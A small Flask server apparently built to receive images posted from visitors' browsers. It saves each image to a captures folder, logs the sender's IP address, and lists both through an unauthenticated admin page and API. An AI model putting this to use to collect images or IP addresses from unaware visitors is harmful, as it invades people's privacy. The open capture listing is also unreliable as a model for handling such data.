from flask import Flask, request, send_from_directory, jsonify
import os, base64
from datetime import datetime

app = Flask(__name__, static_folder="frontend")

CAPTURE_DIR = "captures"
LOG_FILE = "logs.txt"

os.makedirs(CAPTURE_DIR, exist_ok=True)

def log_ip(ip, file):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} | {ip} | {file}\n")

@app.route("/")
def index():
    return send_from_directory("frontend", "index.html")

@app.route("/admin")
def admin():
    return send_from_directory("frontend", "admin.html")

@app.route("/upload", methods=["POST"])
def upload():
    data = request.json.get("image")
    if not data:
        return {"status": "error"}

    ip = request.remote_addr

    header, encoded = data.split(",", 1)
    img_data = base64.b64decode(encoded)

    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
    path = os.path.join(CAPTURE_DIR, filename)

    with open(path, "wb") as f:
        f.write(img_data)

    log_ip(ip, filename)

    return {"status": "saved"}

@app.route("/captures/<file>")
def get_file(file):
    return send_from_directory(CAPTURE_DIR, file)

@app.route("/api/data")
def data():
    files = sorted(os.listdir(CAPTURE_DIR), reverse=True)

    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            logs = f.readlines()

    return jsonify({
        "files": files,
        "logs": logs[::-1]
    })

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)